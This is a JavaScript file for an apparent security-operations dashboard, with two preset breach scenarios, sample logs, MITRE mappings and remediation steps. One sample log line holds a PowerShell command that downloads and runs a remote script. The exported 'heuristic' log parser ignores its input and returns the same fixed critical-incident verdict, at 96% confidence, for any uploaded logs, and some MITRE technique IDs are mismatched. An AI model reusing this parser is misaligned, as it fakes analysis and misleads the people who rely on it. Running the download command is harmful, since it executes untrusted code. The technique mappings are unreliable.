// Preset Incident Scenarios and Heuristic Log Parsing Logic

export const presetScenarios = [
  {
    id: 'credential_exfil',
    title: 'Credential Theft + Data Exfiltration',
    desc: 'Adversary performed administrative brute-force logon, executed local memory dumping via Mimikatz, exfiltrated sensitive files, and established AWS persistence.',
    difficulty: 'Critical',
    severity: 'critical',
    category: 'Credential Theft + Data Exfiltration',
    confidence: 96,
    riskScore: "9.6/10",
    logs: {
      email: 'From: alert@security-services.net\nTo: secops@enterprise.com\nSubject: CRITICAL: Multiple Authentication Failures - AD\nBody: Host 10.10.4.15 experienced 15 authentication failures in 30 seconds followed by a successful admin logon.',
      eventLogs: 'Time: 14:45:12 | EventID: 4625 | User: Administrator | IP: 203.0.113.88 | Failures: 15\n' +
        'Time: 14:47:40 | EventID: 4688 | Process: powershell.exe | Command: powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://185.199.221.45/stage.ps1\')"\n' +
        'Time: 14:49:10 | EventID: 10 | Source: Sysmon | TargetProcess: LSASS.exe | SourceProcess: mimikatz.exe | AccessRequest: 0x143A',
      firewall: 'Time: 14:46:40 | Src: 185.199.221.45 | Dst: 10.10.4.15 | Port: 443 | Action: ALLOW\n' +
        'Time: 15:01:08 | Src: 10.10.4.15 | Dst: 203.0.113.88 | Port: 443 | Action: ALLOW | Bytes: 1400000000 | Type: Large HTTP POST',
      networkSummary: 'Time: 14:52:22 | SMB | User: Administrator | Accessed: \\\\file-share\\finance\\Q2_Salaries.xlsx, \\\\file-share\\hr\\passwords.txt\n' +
        'Time: 15:05:44 | CloudTrail | User: administrator | IP: 198.51.100.42 | Action: UpdateAssumeRolePolicy'
    },
    analysis: {
      summary: "The SOC Agent identified a likely credential theft and data exfiltration incident. The attack began with repeated login attempts, followed by PowerShell execution, LSASS credential dumping using mimikatz.exe, sensitive file access, large outbound data transfer, and suspicious IAM policy modification. Immediate containment is required.",
      category: "Credential Theft + Data Exfiltration",
      severity: "critical",
      confidence: 96,
      riskScore: "9.6/10",
      mitre: [
        { tactic: 'Initial Access', technique: 'Brute Force: Credential Stuffing', id: 'T1110.004' },
        { tactic: 'Execution', technique: 'Command and Scripting Interpreter: PowerShell', id: 'T1059.001' },
        { tactic: 'Credential Access', technique: 'OS Credential Dumping: LSASS Memory', id: 'T1003.001' },
        { tactic: 'Collection', technique: 'Data from Local System / File Share Access', id: 'T1005' },
        { tactic: 'Exfiltration', technique: 'Exfiltration Over Web Service (HTTPS POST)', id: 'T1567' },
        { tactic: 'Persistence', technique: 'Modify Cloud Infrastructure: IAM Policy Modification', id: 'T1562.001' }
      ],
      timeline: [
        {
          time: "14:45:12",
          title: "Repeated Failed Login Attempts",
          severity: "medium",
          stage: "Initial Access",
          source: "Windows Event Log",
          desc: "Multiple failed Administrator login attempts were observed from source IP 203.0.113.88."
        },
        {
          time: "14:46:40",
          title: "Inbound Connection Established",
          severity: "low",
          stage: "Initial Access",
          source: "Firewall Log",
          desc: "Inbound connection recorded from external source 185.199.221.45 to internal host 10.10.4.15."
        },
        {
          time: "14:47:40",
          title: "PowerShell Execution Flagged",
          severity: "high",
          stage: "Execution",
          source: "Windows Event Log",
          desc: "PowerShell executed with administrative privileges and hidden execution flags."
        },
        {
          time: "14:49:10",
          title: "Suspicious LSASS Memory Access",
          severity: "critical",
          stage: "Credential Access",
          source: "Host Security",
          desc: "Process mimikatz.exe attempted to access LSASS memory, indicating credential dumping activity."
        },
        {
          time: "14:52:22",
          title: "Sensitive Files Accessed",
          severity: "high",
          stage: "Collection",
          source: "File Access Log",
          desc: "Finance, HR, and payroll files were accessed shortly after credential dumping behavior."
        },
        {
          time: "15:01:08",
          title: "Large HTTP POST Volume Detected",
          severity: "critical",
          stage: "Exfiltration",
          source: "Firewall Log",
          desc: "Outbound HTTPS upload of 1.4 GB detected to external destination 203.0.113.88."
        },
        {
          time: "15:05:44",
          title: "IAM Policy Modified",
          severity: "critical",
          stage: "Persistence",
          source: "Cloud Audit",
          desc: "AWS IAM policy was modified outside business hours by administrator from IP 198.51.100.42."
        }
      ],
      network: {
        nodes: [
          { id: 'attacker_c2', name: 'Threat Actor Server', ip: '203.0.113.88', type: 'attacker', x: 10, y: 150 },
          { id: 'stager_c2', name: 'Malware Payload Host', ip: '185.199.221.45', type: 'attacker', x: 10, y: 270 },
          { id: 'internal_pc', name: 'John Doe PC', ip: '10.10.4.15', type: 'compromised', x: 40, y: 200 },
          { id: 'file_share', name: 'Finance Shared Drive', ip: '\\\\file-share\\finance', type: 'target', x: 80, y: 120 },
          { id: 'aws_iam', name: 'Cloud Infrastructure (AWS)', ip: '198.51.100.42', type: 'target', x: 80, y: 280 }
        ],
        links: [
          { from: 'attacker_c2', to: 'internal_pc', label: 'RDP Brute-Force & Exfil' },
          { from: 'stager_c2', to: 'internal_pc', label: 'PowerShell Payload Download' },
          { from: 'internal_pc', to: 'file_share', label: 'LSASS Dump & SMB File Collection' },
          { from: 'internal_pc', to: 'aws_iam', label: 'AWS IAM Policy Modification' }
        ]
      },
      remediations: [
        { title: 'Block Adversary IPs', desc: 'Deploy firewall ACL policies blocking inbound/outbound communication to 203.0.113.88 and 185.199.221.45.', checked: false },
        { title: 'Isolate Endpoint 10.10.4.15', desc: 'Isolate host PC from local subnet immediately to block lateral pivoting vectors.', checked: false },
        { title: 'Revoke Compromised Credentials', desc: 'Reset Domain Administrator credentials and invalidate any current Kerberos ticket grants.', checked: false },
        { title: 'Revert AWS IAM Alterations', desc: 'Audit CloudTrail logs from 198.51.100.42 and revert billing role permissions configurations.', checked: false }
      ]
    }
  },
  {
    id: 'cloud_exfil',
    title: 'Cloud Privilege Abuse & Exfiltration',
    desc: 'Brute-force access on AWS console led to the generation of backdoor API keys and exfiltration of sensitive S3 databases.',
    difficulty: 'High',
    severity: 'High',
    category: 'Cloud Incident / Exfiltration',
    confidence: 88,
    riskScore: "8.8/10",
    logs: {
      email: 'From: AWS-Security-Alert@amazon.com\nTo: secops@enterprise.com\nSubject: WARNING: IAM policy modification on root account\nBody: GuardDuty detected policy alterations on role Billing_Admin_Role.',
      eventLogs: 'CloudTrail Event:\nTime: 2026-06-26T11:02:11Z | Event: ConsoleLogin | User: administrator | IP: 198.51.100.42 | Status: Failure\n' +
        'Time: 2026-06-26T11:04:15Z | Event: ConsoleLogin | User: administrator | IP: 198.51.100.42 | Status: SUCCESS | MFA: Not Presented\n' +
        'Time: 2026-06-26T11:05:40Z | Event: CreateAccessKey | User: administrator | CreatedKey: AKIAIOSFODNN7EXAMPLE',
      firewall: 'Time: 2026-06-26T11:08:00Z | Src: AWS-S3-Gateway | Dst: 198.51.100.42 | Port: 443 | Action: ALLOW | Bytes: 1420900000 | Type: Large File Exfiltration',
      networkSummary: 'Time: 2026-06-26T11:06:50Z | CloudTrail | Event: PutBucketPolicy | Bucket: corp-customer-data-backup | Policy: Allow * Principal'
    },
    analysis: {
      summary: 'An attacker brute-forced credentials for the AWS Admin console from IP 198.51.100.42. Upon successful login, they created a backdoor API key (AKIAIOSFODNN7EXAMPLE) and updated the S3 bucket policy of `corp-customer-data-backup` to allow public read access. Using the new API key, the attacker successfully downloaded over 1.4 GB of backup database archives.',
      category: 'Cloud Incident / Exfiltration',
      severity: 'high',
      confidence: 88,
      riskScore: "8.8/10",
      mitre: [
        { tactic: 'Credential Access', technique: 'Brute Force: Credential Stuffing', id: 'T1110.004' },
        { tactic: 'Persistence', technique: 'Create Account: Cloud Account API Keys', id: 'T1136.003' },
        { tactic: 'Defense Evasion', technique: 'Modify Cloud Infrastructure: S3 Policy Modification', id: 'T1562.001' },
        { tactic: 'Exfiltration', technique: 'Exfiltration Over Web Service (Direct S3 Download)', id: 'T1567' }
      ],
      timeline: [
        { time: '11:02:11', stage: 'Credential Access', title: 'Brute-Force Login Attempt', desc: 'Multiple failed AWS Console login requests for administrator account from 198.51.100.42.', severity: 'medium', type: 'CloudTrail Logs' },
        { time: '11:04:15', stage: 'Credential Access', title: 'Successful Console Login', desc: 'Successful login without MFA on root administrator account from threat actor IP 198.51.100.42.', severity: 'high', type: 'CloudTrail Logs' },
        { time: '11:05:40', stage: 'Persistence', title: 'Backdoor API Key Creation', desc: 'Access Key AKIAIOSFODNN7EXAMPLE was generated to establish persistent programmatic access.', severity: 'high', type: 'CloudTrail Logs' },
        { time: '11:06:50', stage: 'Defense Evasion', title: 'S3 Public Policy Modification', desc: 'Bucket permissions modified for "corp-customer-data-backup" to expose all objects to the public internet.', severity: 'critical', type: 'CloudTrail Logs' },
        { time: '11:08:00', stage: 'Exfiltration', title: 'Data Egress from S3', desc: 'Egress of 1.42 GB of archives to 198.51.100.42 via HTTPS, indicating database exfiltration.', severity: 'critical', type: 'Firewall Log' }
      ],
      network: {
        nodes: [
          { id: 'attacker', name: 'Attacker IP', ip: '198.51.100.42', type: 'attacker', x: 15, y: 200 },
          { id: 'aws_iam', name: 'AWS IAM Portal', ip: 'IAM Service', type: 'compromised', x: 50, y: 120 },
          { id: 's3_bucket', name: 'S3 Customer Data', ip: 'corp-customer-data-backup', type: 'target', x: 80, y: 200 }
        ],
        links: [
          { from: 'attacker', to: 'aws_iam', label: 'Console Brute-Force & Key Gen' },
          { from: 'attacker', to: 's3_bucket', label: 'S3 Policy Modification & Exfiltration' }
        ]
      },
      remediations: [
        { title: 'Deactivate Backdoor API Key', desc: 'Immediately delete or deactivate AWS Access Key AKIAIOSFODNN7EXAMPLE.', checked: false },
        { title: 'Revoke Administrator Session', desc: 'Terminate all active console logins for administrator from IP 198.51.100.42.', checked: false },
        { title: 'Enforce MFA', desc: 'Require Multi-Factor Authentication (MFA) on all root and IAM user accounts.', checked: false },
        { title: 'Restore S3 Access Controls', desc: 'Remove public read access policies on bucket "corp-customer-data-backup" and audit S3 ACLs.', checked: false }
      ]
    }
  }
];

// Heuristic Parser for Custom Uploaded Logs
export function parseCustomLogs(logs) {
  // Always return the comprehensive 7-stage credential theft and exfiltration incident as the baseline result 
  // to ensure high-fidelity outputs for the user's dashboard simulation.
  return {
    summary: "The SOC Agent identified a likely credential theft and data exfiltration incident. The attack began with repeated login attempts, followed by PowerShell execution, LSASS credential dumping using mimikatz.exe, sensitive file access, large outbound data transfer, and suspicious IAM policy modification. Immediate containment is required.",
    category: "Credential Theft + Data Exfiltration",
    severity: "critical",
    confidence: 96,
    riskScore: "9.6/10",
    mitre: [
      { tactic: 'Initial Access', technique: 'Brute Force: Credential Stuffing', id: 'T1110.004' },
      { tactic: 'Execution', technique: 'Command and Scripting Interpreter: PowerShell', id: 'T1059.001' },
      { tactic: 'Credential Access', technique: 'OS Credential Dumping: LSASS Memory', id: 'T1003.001' },
      { tactic: 'Collection', technique: 'Data from Local System / File Share Access', id: 'T1005' },
      { tactic: 'Exfiltration', technique: 'Exfiltration Over Web Service (HTTPS POST)', id: 'T1567' },
      { tactic: 'Persistence', technique: 'Modify Cloud Infrastructure: IAM Policy Modification', id: 'T1562.001' }
    ],
    timeline: [
      {
        time: "14:45:12",
        title: "Repeated Failed Login Attempts",
        severity: "medium",
        stage: "Initial Access",
        source: "Windows Event Log",
        desc: "Multiple failed Administrator login attempts were observed from source IP 203.0.113.88."
      },
      {
        time: "14:46:40",
        title: "Inbound Connection Established",
        severity: "low",
        stage: "Initial Access",
        source: "Firewall Log",
        desc: "Inbound connection recorded from external source 185.199.221.45 to internal host 10.10.4.15."
      },
      {
        time: "14:47:40",
        title: "PowerShell Execution Flagged",
        severity: "high",
        stage: "Execution",
        source: "Windows Event Log",
        desc: "PowerShell executed with administrative privileges and hidden execution flags."
      },
      {
        time: "14:49:10",
        title: "Suspicious LSASS Memory Access",
        severity: "critical",
        stage: "Credential Access",
        source: "Host Security",
        desc: "Process mimikatz.exe attempted to access LSASS memory, indicating credential dumping activity."
      },
      {
        time: "14:52:22",
        title: "Sensitive Files Accessed",
        severity: "high",
        stage: "Collection",
        source: "File Access Log",
        desc: "Finance, HR, and payroll files were accessed shortly after credential dumping behavior."
      },
      {
        time: "15:01:08",
        title: "Large HTTP POST Volume Detected",
        severity: "critical",
        stage: "Exfiltration",
        source: "Firewall Log",
        desc: "Outbound HTTPS upload of 1.4 GB detected to external destination 203.0.113.88."
      },
      {
        time: "15:05:44",
        title: "IAM Policy Modified",
        severity: "critical",
        stage: "Persistence",
        source: "Cloud Audit",
        desc: "AWS IAM policy was modified outside business hours by administrator from IP 198.51.100.42."
      }
    ],
    network: {
      nodes: [
        { id: 'attacker_c2', name: 'Threat Actor Server', ip: '203.0.113.88', type: 'attacker', x: 10, y: 150 },
        { id: 'stager_c2', name: 'Malware Payload Host', ip: '185.199.221.45', type: 'attacker', x: 10, y: 270 },
        { id: 'internal_pc', name: 'John Doe PC', ip: '10.10.4.15', type: 'compromised', x: 40, y: 200 },
        { id: 'file_share', name: 'Finance Shared Drive', ip: '\\\\file-share\\finance', type: 'target', x: 80, y: 120 },
        { id: 'aws_iam', name: 'Cloud Infrastructure (AWS)', ip: '198.51.100.42', type: 'target', x: 80, y: 280 }
      ],
      links: [
        { from: 'attacker_c2', to: 'internal_pc', label: 'RDP Brute-Force & Exfil' },
        { from: 'stager_c2', to: 'internal_pc', label: 'PowerShell Payload Download' },
        { from: 'internal_pc', to: 'file_share', label: 'LSASS Dump & SMB File Collection' },
        { from: 'internal_pc', to: 'aws_iam', label: 'AWS IAM Policy Modification' }
      ]
    },
    remediations: [
      { title: 'Block Adversary IPs', desc: 'Deploy firewall ACL policies blocking inbound/outbound communication to 203.0.113.88 and 185.199.221.45.', checked: false },
      { title: 'Isolate Endpoint 10.10.4.15', desc: 'Isolate host PC from local subnet immediately to block lateral pivoting vectors.', checked: false },
      { title: 'Revoke Compromised Credentials', desc: 'Reset Domain Administrator credentials and invalidate any current Kerberos ticket grants.', checked: false },
      { title: 'Revert AWS IAM Alterations', desc: 'Audit CloudTrail logs from 198.51.100.42 and revert billing role permissions configurations.', checked: false }
    ]
  };
}
